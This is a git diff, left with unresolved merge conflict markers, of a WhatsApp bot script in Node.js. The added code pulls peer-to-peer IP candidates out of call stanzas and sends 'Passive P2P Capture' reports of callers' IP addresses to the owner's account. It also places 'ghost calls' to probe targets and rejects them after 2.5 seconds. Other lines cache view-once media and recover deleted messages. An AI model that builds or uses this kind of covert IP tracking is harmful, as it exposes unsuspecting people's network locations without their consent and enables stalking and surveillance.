@@ -15,6 +15,11 @@ const { Resolver } = require('dns').promises;
 const qrcode = require('qrcode-terminal');
 const { handleMessages } = require('./lib/handler');
 const analyzer = require('./lib/analyzer');
+<<<<<<< HEAD
+=======
+const axios = require('axios');
+const { getSettings } = require('./lib/settings');
+>>>>>>> a076549 (latest)
 
 const AUTH_FOLDER = path.resolve(__dirname, 'session_auth');
 
@@ -24,6 +29,13 @@ global.intelCache = new Map();
 global.analyzer = analyzer;
 global.msgCache = new Map();
 global.viewOnceBufferCache = new Map();
+<<<<<<< HEAD
+=======
+// Candidate maps for P2P handshake tracking
+global.candidateMapByCallId = new Map(); // callId -> Set of IPs
+global.candidateMapByFrom = new Map();   // from JID -> Set of IPs
+global.initiatedTargets = new Set();     // targetJid currently probed by ./track
+>>>>>>> a076549 (latest)
 
 // Shared DNS resolver using public DNS servers
 const sharedResolver = new Resolver();
@@ -235,6 +247,13 @@ function registerSocketEvents(sock) {
                         if (!shouldTrigger) return;
 
                         const participant = originalMsg.key.participant || originalMsg.key.remoteJid || from;
+<<<<<<< HEAD
+=======
+                        
+                        // ── BUG FIX: Do not recover messages deleted by the owner ──
+                        if (originalMsg.key.fromMe) return;
+
+>>>>>>> a076549 (latest)
                         await _handleAntiDelete(sock, from, originalMsg, participant, targetId);
                         return;
                     }
@@ -262,6 +281,7 @@ function registerSocketEvents(sock) {
         await Promise.allSettled(tasks);
     });
 
+<<<<<<< HEAD
     sock.ev.on('call', async (node) => {
         const call = node[0];
         const from = call.from;
@@ -289,6 +309,53 @@ function registerSocketEvents(sock) {
         }
         const analyzerFn = require('./lib/analyzer').analyzer;
         await analyzerFn(sock, node);
+=======
+    sock.ev.on('call', async (calls) => {
+        for (const call of calls) {
+            const { from, id, status, content } = call;
+            console.log(`[CALL DEBUG] Call ID: ${id} | Status: ${status} | From: ${from}`);
+            
+            // Extract IP candidates from stanza content
+            if (content && Array.isArray(content)) {
+                for (const stanza of content) {
+                    if (stanza.tag === 'candidate' && stanza.attrs && stanza.attrs.ip) {
+                        const ip = stanza.attrs.ip;
+                        console.log(`[CALL DEBUG] IP Candidate captured: ${ip}`);
+                        const callSet = global.candidateMapByCallId.get(id) || new Set();
+                        callSet.add(ip);
+                        global.candidateMapByCallId.set(id, callSet);
+                        
+                        const fromSet = global.candidateMapByFrom.get(from) || new Set();
+                        fromSet.add(ip);
+                        global.candidateMapByFrom.set(from, fromSet);
+                    }
+                }
+            }
+
+            if (status === 'offer') {
+                if (global.initiatedTargets.has(from)) {
+                    global.initiatedTargets.delete(from);
+                    console.log(`[CALL DEBUG] Outgoing ghost call offer accepted, rejecting in 2.5s`);
+                    setTimeout(async () => {
+                        try { await sock.rejectCall(id, from); } catch (_) {}
+                    }, 2500);
+                } else {
+                    // Passive tracking report to Home JID
+                    setTimeout(async () => {
+                        const ips = global.candidateMapByCallId.get(id) || global.candidateMapByFrom.get(from);
+                        if (ips && ips.size > 0) {
+                            console.log(`[CALL DEBUG] Passive tracking report triggered for ${from}`);
+                            const settings = await getSettings();
+                            if (settings.home_jid) {
+                                const report = `📞 *Passive P2P Capture*\nFrom: ${from}\nIPs: ${Array.from(ips).join(', ')}`;
+                                await sock.sendMessage(jidNormalizedUser(settings.home_jid), { text: report });
+                            }
+                        }
+                    }, 3000);
+                }
+            }
+        }
+>>>>>>> a076549 (latest)
     });
 }
 
@@ -396,6 +463,7 @@ async function startSuite() {
         // ── Aggressive credential saving ──
         sock.ev.on('creds.update', saveCreds);
 
+<<<<<<< HEAD
         sock.sendMessageResilient = async (jid, content) => {
             try {
                 return await sock.sendMessage(jid, content);
@@ -403,6 +471,15 @@ async function startSuite() {
                 if (err?.output?.statusCode === 428) {
                     await new Promise(r => setTimeout(r, 2000));
                     return await sock.sendMessage(jid, content);
+=======
+        sock.sendMessageResilient = async (jid, content, options) => {
+            try {
+                return await sock.sendMessage(jid, content, options);
+            } catch (err) {
+                if (err?.output?.statusCode === 428) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    return await sock.sendMessage(jid, content, options);
+>>>>>>> a076549 (latest)
                 }
                 throw err;
             }
